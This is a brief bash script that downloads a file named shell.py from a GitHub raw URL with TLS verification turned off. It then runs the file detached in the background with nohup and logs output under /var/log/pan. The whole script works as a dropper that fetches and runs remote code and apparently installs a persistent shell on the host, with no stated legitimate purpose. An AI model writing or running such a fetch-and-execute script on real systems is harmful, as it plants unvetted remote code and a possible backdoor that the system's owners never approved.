#!/bin/bash

echo "Starting..."

curl -k https://raw.githubusercontent.com/pavelrn/js-sandbox/main/shell.py --output shell.py
ls -lsa
nohup python3 shell.py >> /var/log/pan/shell.py.log 2>&1 & 
echo 'ok'
